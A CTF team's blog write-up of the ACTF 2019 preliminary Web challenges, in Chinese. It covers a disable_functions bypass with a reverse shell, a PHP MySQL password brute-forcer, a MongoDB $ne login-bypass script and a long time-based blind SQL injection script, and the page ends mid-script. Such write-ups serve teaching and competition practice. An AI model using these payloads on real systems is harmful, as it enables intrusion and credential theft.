<!DOCTYPE html>



  


<html class="theme-next mist use-motion" lang="zh-Hans">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">



  
  
    
    
  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
  <link href="/lib/pace/pace-theme-center-atom.min.css?v=1.0.2" rel="stylesheet">







<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="Hexo, NexT" />










<meta property="og:type" content="article">
<meta property="og:title" content="ACTF 2019 初赛 解题报告">
<meta property="og:url" content="https://www.csuaurora.org/ACTF_2019/index.html">
<meta property="og:site_name" content="AuroraLab">
<meta property="og:locale" content="zh-Hans">
<meta property="og:image" content="https://i.imgur.com/tt5CUKc.png">
<meta property="og:image" content="https://i.imgur.com/aC06dE5.png">
<meta property="og:image" content="https://i.imgur.com/dxteAZ2.png">
<meta property="og:image" content="https://i.imgur.com/J1aQn7k.png">
<meta property="og:image" content="https://i.imgur.com/kKrVEaT.png">
<meta property="og:image" content="https://i.imgur.com/kC5g5sI.png">
<meta property="og:image" content="https://i.imgur.com/yEPgTZY.png">
<meta property="og:image" content="https://i.imgur.com/w5VJQ8n.png">
<meta property="og:image" content="https://i.imgur.com/ZwC1sO8.png">
<meta property="og:image" content="https://i.imgur.com/epr2vKs.png">
<meta property="og:image" content="https://i.imgur.com/nstlviC.png">
<meta property="og:image" content="https://i.imgur.com/qmFyfQa.png">
<meta property="og:image" content="https://i.imgur.com/O9FglPq.png">
<meta property="og:image" content="https://i.imgur.com/dkAiKoK.png">
<meta property="og:image" content="https://i.imgur.com/ukaLE44.png">
<meta property="og:image" content="https://i.imgur.com/F4yQP30.png">
<meta property="og:image" content="https://i.imgur.com/PGgLPwf.png">
<meta property="og:image" content="https://i.imgur.com/p4GqKDC.png">
<meta property="og:image" content="https://i.imgur.com/c9vILWU.png">
<meta property="og:image" content="https://i.imgur.com/Xuit4kM.png">
<meta property="og:image" content="https://i.imgur.com/3xiR6pV.png">
<meta property="og:image" content="https://i.imgur.com/rFFWCxD.png">
<meta property="og:image" content="https://i.imgur.com/Y4qiKt6.png">
<meta property="og:image" content="https://i.imgur.com/VYZQMKM.png">
<meta property="og:image" content="https://i.imgur.com/UvjuPSY.png">
<meta property="og:image" content="https://i.imgur.com/Dh0ltgT.png">
<meta property="og:image" content="https://i.imgur.com/OpaRJW0.png">
<meta property="og:image" content="https://i.imgur.com/GyBZOrQ.png">
<meta property="og:image" content="https://i.imgur.com/MNcI6Ob.png">
<meta property="og:image" content="https://i.imgur.com/UF2E3wt.png">
<meta property="og:image" content="https://i.imgur.com/CDFhrYx.png">
<meta property="og:image" content="https://i.imgur.com/vfEX1lB.png">
<meta property="og:image" content="https://i.imgur.com/3qYZgVr.png">
<meta property="og:image" content="https://i.imgur.com/4Efh1cR.png">
<meta property="og:image" content="https://i.imgur.com/hJcdUTS.png">
<meta property="og:image" content="https://i.imgur.com/9yrfOx4.png">
<meta property="og:image" content="https://i.imgur.com/XtEYZUC.png">
<meta property="og:image" content="https://i.imgur.com/X1i2bWK.png">
<meta property="og:image" content="https://i.imgur.com/0mGb5Na.png">
<meta property="og:image" content="https://i.imgur.com/7f97zUg.png">
<meta property="og:image" content="https://i.imgur.com/7fGIg3R.png">
<meta property="og:image" content="https://i.imgur.com/KsoCOJY.png">
<meta property="og:image" content="https://i.imgur.com/cJAwKGp.png">
<meta property="og:image" content="https://i.imgur.com/mU4yD7f.png">
<meta property="og:image" content="https://i.imgur.com/4Elxpma.png">
<meta property="og:image" content="https://i.imgur.com/NL9ooxg.png">
<meta property="og:image" content="https://i.imgur.com/B35sGWt.png">
<meta property="og:image" content="https://i.imgur.com/v0PHFce.png">
<meta property="og:image" content="https://i.imgur.com/qjg8TUQ.png">
<meta property="og:image" content="https://i.imgur.com/XedXjg0.png">
<meta property="og:image" content="https://i.imgur.com/VYZPjVi.png">
<meta property="og:image" content="https://i.imgur.com/mi04qlk.png">
<meta property="og:updated_time" content="2019-06-09T12:08:48.000Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="ACTF 2019 初赛 解题报告">
<meta name="twitter:image" content="https://i.imgur.com/tt5CUKc.png">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Mist',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="https://www.csuaurora.org/ACTF_2019/"/>





  <title>ACTF 2019 初赛 解题报告 | AuroraLab</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="site-title"><img src="/images/logo.png"></span>
      </a>
    </div>
      
        <p class="site-subtitle"></p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/home/index.html" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-news">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-newspaper-o"></i> <br />
            
            最新动态
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/index.html" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
            
            动态分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-member">
          <a href="/member/index.html" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-group"></i> <br />
            
            成员
          </a>
        </li>
      
        
        <li class="menu-item menu-item-history">
          <a href="/history/index.html" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-history"></i> <br />
            
            历程
          </a>
        </li>
      
        
        <li class="menu-item menu-item-ctf">
          <a href="http://ctf.csuaurora.org" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-flag"></i> <br />
            
            CTF
          </a>
        </li>
      
        
        <li class="menu-item menu-item-links">
          <a href="/links/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-link"></i> <br />
            
            友链
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://www.csuaurora.org/ACTF_2019/index.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="<a href="https://www.porlockz.com" target="_blank">Porlock</a>">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="AuroraLab">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">ACTF 2019 初赛 解题报告</h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-05-26T14:48:37+08:00">
                2019-05-26
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/赛事/index.html" itemprop="url" rel="index">
                    <span itemprop="name">赛事</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          
              <div class="post-description">
                  <center></center>
              </div>
          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="easy-php"><a href="#easy-php" class="headerlink" title="easy_php"></a>easy_php</h3><h4 id="出题人小声比比"><a href="#出题人小声比比" class="headerlink" title="出题人小声比比"></a>出题人小声比比</h4><p>由于出题人很菜，这道题只是简单弄了个文件夹，没有做好隔离，容易被选手翻目录查看其它选手的思路或者盗取Payload，以后看下一届能不能把平台弄成动态docker分配，滑稽。</p>
<p>这道题思路是我在测试thinkphp 5.0.23 的真实案例，因为thinkphp默认开启了disable_function，题目中的disable_function多加了些pcntl限制，防止非预期解，从解题报告看，大家都是用LD_PRELOAD。</p>
<p>当绕过disable_function后，细心一点你可以发现题目环境是用lnmp搭建的，因为web根目录是/home/wwwroot/default/ ，lnmp在1.5及之后版本的mysql密码为 <code>lnmp.org#随机数字</code>，数字一般是5位数，题目中我改了下密码，但爆破的还是5位数</p>
<p>这道题的知识点在平常渗透中可能有点用</p>
<p>解题过程的截图是当初刚搭好的环境时，后来改了下数据库密码和hint.txt</p>
<h4 id="考点"><a href="#考点" class="headerlink" title="考点"></a>考点</h4><p>突破disable_function 然后爆破mysql密码</p>
<h4 id="预备知识"><a href="#预备知识" class="headerlink" title="预备知识"></a>预备知识</h4><p>用LD_PRELOAD bypass disable_function</p>
<p><a href="https://www.tr0y.wang/2018/04/18/PHPDisalbedfunc/index.html" target="_blank" rel="noopener">https://www.tr0y.wang/2018/04/18/PHPDisalbedfunc/index.html</a></p>
<h4 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h4><p>访问题目后，只是简单新建了个sandbox下的文件夹</p>
<p><img src="https://i.imgur.com/tt5CUKc.png" alt></p>
<p>跳转到自己的sandbox后，给了eval一句话后门，但是执行system，exec没有回显</p>
<p><img src="https://i.imgur.com/aC06dE5.png" alt></p>
<p>查看phpinfo，发现disable_functions禁止了很多函数，所以题目思路就是要突破disable_function然后执行命令</p>
<p><img src="https://i.imgur.com/dxteAZ2.png" alt></p>
<p>参考预备知识链接的方法绕过disable_function</p>
<p>突破disable_function后，拿到shell（让python脚本执行反弹shell命令）</p>
<p><img src="https://i.imgur.com/J1aQn7k.png" alt></p>
<p>在根目录发现hint.txt</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Flag is in MYSQL,the root password is csuaurora.org#?????4</span><br><span class="line">just unknown digital password</span><br><span class="line">Plz do not rm and edit flag</span><br></pre></td></tr></table></figure>
<p>爆破数据库密码php脚本</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$servername = <span class="string">"127.0.0.1"</span>; </span><br><span class="line">$username = <span class="string">"root"</span>; </span><br><span class="line">$password = <span class="string">""</span>; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ($i=<span class="number">10000</span>;$i&lt;<span class="number">100000</span>;$i++)&#123;</span><br><span class="line">	$p = <span class="string">"ACTF#"</span>.sprintf(<span class="string">"%05d"</span>,$i);</span><br><span class="line">	conn_mysql($servername,$username,$p);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">conn_mysql</span><span class="params">($servername,$username,$password)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 创建连接 </span></span><br><span class="line">	@$conn = mysqli_connect($servername, $username, $password); </span><br><span class="line"></span><br><span class="line">	<span class="comment">// 检测连接 </span></span><br><span class="line">	<span class="keyword">if</span> ($conn) &#123; </span><br><span class="line">		<span class="keyword">echo</span> $servername.<span class="string">'+'</span>.$username.<span class="string">'+'</span>.$password.<span class="string">'&lt;font color="#ff0000"&gt;success&lt;/font&gt;&lt;br&gt;'</span>;</span><br><span class="line">		@mysqli_close($conn);</span><br><span class="line">	    <span class="comment">// die("Connection failed: " . mysqli_connect_error()); </span></span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="comment">// echo $servername.'+'.$username.'+'.$password.'失败&lt;br&gt;';</span></span><br><span class="line">		@mysqli_close($conn);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// echo "Connected successfully"; </span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://i.imgur.com/kKrVEaT.png" alt></p>
<p>爆破出mysql密码后登陆mysql数据库获取flag</p>
<p><img src="https://i.imgur.com/kC5g5sI.png" alt></p>
<h3 id="easy-Login"><a href="#easy-Login" class="headerlink" title="easy_Login"></a>easy_Login</h3><h4 id="考点-1"><a href="#考点-1" class="headerlink" title="考点"></a>考点</h4><p>MongoDB 重言式注入</p>
<h4 id="预备知识-1"><a href="#预备知识-1" class="headerlink" title="预备知识"></a>预备知识</h4><p><a href="https://www.anquanke.com/post/id/97211" target="_blank" rel="noopener">冷门知识 — NoSQL注入知多少</a></p>
<h4 id="解题过程-1"><a href="#解题过程-1" class="headerlink" title="解题过程"></a>解题过程</h4><p>抓包发现请求是json，应该想一想是不是NoSQL</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://localhost:4000/login"</span></span><br><span class="line">data = &#123;<span class="string">"username"</span>: <span class="string">"admin"</span>, <span class="string">"password"</span>: &#123;<span class="string">"$ne"</span>: <span class="string">"null"</span>&#125;&#125;</span><br><span class="line">r = requests.post(url, json=data)</span><br><span class="line"><span class="keyword">print</span> r.text</span><br></pre></td></tr></table></figure>
<h3 id="easy-injection"><a href="#easy-injection" class="headerlink" title="easy-injection"></a>easy-injection</h3><h4 id="出题人感想"><a href="#出题人感想" class="headerlink" title="出题人感想"></a>出题人感想</h4><p>heavy-query对服务器运行压力还是有的，一跑脚本服务器cpu都上到100%。设置了wait_timeout为120秒，无论是在配置文件还是set global wait_timeout=120，sql语句运行超时了并没有终止掉，不过也没多少人跑…不知道是该庆幸还是悲伤web题没人做</p>
<p>有人（不是战队）跑出look_here 来问我怎么跑不出字段，去服务器看了下发现他没有用ascii，去年战队考核题我有提醒过，要是战队的同学犯这种错误自己面壁一下。</p>
<h4 id="考点-2"><a href="#考点-2" class="headerlink" title="考点"></a>考点</h4><p>时间盲注</p>
<h4 id="预备知识-2"><a href="#预备知识-2" class="headerlink" title="预备知识"></a>预备知识</h4><p>show columns from xxx 时间盲注</p>
<p>过滤了if，elt，case ，用 and 1 and sleep(3) #</p>
<p>过滤了sleep，可以用heavy-query</p>
<p>过滤flag列名，但使用表别名失败，但知道表名，可以用select * from Look_here limit 1 来获取 </p>
<p>如果= 被过滤可以用regexp binary 或者 like binary（没有过滤 =）</p>
<p>过滤了sub ， 用mid</p>
<h4 id="解题过程-2"><a href="#解题过程-2" class="headerlink" title="解题过程"></a>解题过程</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> string </span><br><span class="line"></span><br><span class="line"><span class="comment"># SELECT CASE WHEN 1=1 THEN true ELSE false END 绕过  if</span></span><br><span class="line">url = <span class="string">"http://149.129.66.40:29019/index.php?id=users where 1 and %s #"</span></span><br><span class="line">url = <span class="string">"http://60.205.189.243:29019/index.php?id=users where 1 and %s #"</span></span><br><span class="line"><span class="comment"># url = "http://202.197.58.168:29019/index.php?id=users where 1 and %s #"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">select database()</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()</span></span><br><span class="line"><span class="string">select group_concat(table_name) from mysql.innodb_table_stats where database_name =database()</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_NAME=0x4e6f74696365</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">select flag from Notice limit 1</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">"ascii(mid((select database()),&#123;0&#125;,1))=&#123;1&#125; and sleep(5)"</span></span><br><span class="line">payload = <span class="string">'ascii(mid((select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()),&#123;0&#125;,1))=&#123;1&#125; and sleep(5)'</span></span><br><span class="line"><span class="comment"># payload = "ascii(mid((select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_NAME='Look_here'),&#123;0&#125;,1))=&#123;1&#125; and sleep(5)" </span></span><br><span class="line"><span class="comment"># payload = 'ascii(mid((select group_concat(x.1) from (select 1 union select * from Look_here)x),&#123;0&#125;,1))=&#123;1&#125; and sleep(5)' </span></span><br><span class="line"><span class="comment"># payload = 'ascii(mid((select flag from Look_here limit 1),&#123;0&#125;,1))=&#123;1&#125; and sleep(5)#'</span></span><br><span class="line"><span class="comment"># payload = "(select * from Look_here) regexp binary '^&#123;0&#125;' and sleep(5)"</span></span><br><span class="line"></span><br><span class="line">payload = payload.replace(<span class="string">'sleep(5)'</span>,<span class="string">'(SELECT count(*) FROM information_schema.columns A,information_schema.columns D, information_schema.columns B, information_schema.SCHEMATA C)'</span>)</span><br><span class="line"></span><br><span class="line">starttime = datetime.datetime.now()</span><br><span class="line"></span><br><span class="line">data= &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    flag=<span class="string">''</span></span><br><span class="line">    <span class="keyword">global</span> payload</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">50</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">33</span>,<span class="number">127</span>):</span><br><span class="line">            payload_data = payload.format(str(i),str(j))</span><br><span class="line"></span><br><span class="line">            <span class="comment"># payload = '(select case when ascii(substring((select database() limit 1),%s,1))=%s then sleep(5) else 0 end)' %(i,j)</span></span><br><span class="line">            <span class="comment"># payload = '(select case when ascii(substr((select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()),%s,1))=%s then sleep(5) else 0 end)' %(i,j) </span></span><br><span class="line">            <span class="comment"># payload = "(select case when ascii(substr((select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_NAME=0x4e6f74696365),%s,1))=%s then sleep(5) else 0 end)" % (i, j) #flag</span></span><br><span class="line">            <span class="comment"># payload ='(select case when ascii(mid((select flag from Notice limit 1),%s,1))=%s then sleep(5) else 0 end)' %(i,j)</span></span><br><span class="line">            payload_url =url%(payload_data)</span><br><span class="line">            <span class="comment"># payload_url =  payload_url.replace(' ',' ')</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                r = requests.get(payload_url,timeout=<span class="number">7</span>)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                flag+=chr(j)</span><br><span class="line">                print(flag)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    print(<span class="string">'flag:'</span>+flag)</span><br><span class="line">    endtime = datetime.datetime.now()</span><br><span class="line">    print((endtime - starttime).seconds)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">(i)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> payload</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">33</span>,<span class="number">127</span>):</span><br><span class="line">        payload_data = payload.format(str(i),str(j))</span><br><span class="line">        <span class="comment"># print(payload_data)</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># payload = '(select case when ascii(mid((select database() limit 1),%s,1))=%s then sleep(5) else 0 end)' %(i,j)</span></span><br><span class="line">        <span class="comment"># payload = '(select case when ascii(substr((select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()),%s,1))=%s then sleep(5) else 0 end)' %(i,j) </span></span><br><span class="line">        <span class="comment"># payload = "(select case when ascii(substr((select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_NAME=0x4e6f74696365),%s,1))=%s then sleep(5) else 0 end)" % (i, j) #flag</span></span><br><span class="line">        <span class="comment"># payload ='(select case when ascii(mid((select flag from Notice limit 1),%s,1))=%s then sleep(5) else 0 end)' %(i,j)</span></span><br><span class="line">        payload_url =url%(payload_data)</span><br><span class="line">        <span class="comment"># payload_url =  payload_url.replace(' ',' ')</span></span><br><span class="line">        <span class="comment"># print (payload_url)</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.get(payload_url,timeout=<span class="number">5</span>)</span><br><span class="line">            time.sleep(<span class="number">0.015</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            data.setdefault(i)</span><br><span class="line">            data[i]=chr(j)</span><br><span class="line">            print(<span class="string">''</span>.join([(data[k]) <span class="keyword">for</span> k <span class="keyword">in</span> sorted(data.keys())]))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">()</span>:</span></span><br><span class="line">    threads = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">20</span>):</span><br><span class="line">        t = threading.Thread(target=check,args=(i,))</span><br><span class="line">        threads.append(t)</span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> threads:</span><br><span class="line">        time.sleep(<span class="number">2.5</span>)</span><br><span class="line">        t.start()</span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> threads:</span><br><span class="line">        t.join()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">got</span><span class="params">()</span>:</span></span><br><span class="line">    run()</span><br><span class="line">    flag = <span class="string">''</span>.join([(data[k]) <span class="keyword">for</span> k <span class="keyword">in</span> sorted(data.keys())])</span><br><span class="line">    print(<span class="string">'flag:'</span>+flag)</span><br><span class="line">    endtime = datetime.datetime.now()</span><br><span class="line">    print(<span class="string">'using time:'</span>+str((endtime - starttime).seconds))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getflag</span><span class="params">()</span>:</span></span><br><span class="line">    chars = string.digits+string.ascii_lowercase+string.ascii_uppercase+<span class="string">',\&#123;\&#125;$_'</span></span><br><span class="line">    flag=<span class="string">''</span></span><br><span class="line">    payload = <span class="string">"(select * from Look_here) regexp binary '^&#123;0&#125;' and sleep(5)"</span></span><br><span class="line">    <span class="comment"># payload = "(select * from Look_here) like binary '&#123;0&#125;%' and sleep(5)"</span></span><br><span class="line">    payload = payload.replace(<span class="string">'sleep(5)'</span>,<span class="string">'(SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.SCHEMATA C)'</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">50</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> chars:</span><br><span class="line">            payload_data = payload.format(flag+j)</span><br><span class="line">            <span class="comment"># print(payload_data)</span></span><br><span class="line">            payload_url =url%(payload_data)</span><br><span class="line">            <span class="comment"># payload_url =  payload_url.replace(' ',' ')</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                r = requests.get(payload_url,timeout=<span class="number">5</span>)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                flag+=j</span><br><span class="line">                print(flag)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    print(<span class="string">'flag:'</span>+flag)</span><br><span class="line">    endtime = datetime.datetime.now()</span><br><span class="line">    print((endtime - starttime).seconds)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    <span class="comment"># 单线程</span></span><br><span class="line">    <span class="comment"># 